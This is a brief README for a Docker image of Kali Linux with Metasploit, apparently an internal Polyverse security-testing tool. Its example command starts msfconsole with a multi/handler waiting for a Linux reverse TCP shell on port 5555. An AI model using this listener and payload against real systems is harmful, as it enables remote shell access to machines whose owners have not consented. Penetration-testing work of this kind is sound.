# kali-metasploit
Containerized Kali Linux with Metasploit Framework installed. Repo is designed to install Polyverse custom modules.

## Build
```
pv build docker
```

## Usage
```
docker run -it polyverse/kali-metasploit msfconsole
```

## Example
You can use the `-x` switch with msfconsole and then specify all the msf commands you want to run in a single double-quoted argument.
```
docker run -it -p 5555:5555 polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $(docker run -it -p 5555:5555 polyverse-internal.jfrog.io/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}'); set LPORT 5555; exploit"
```
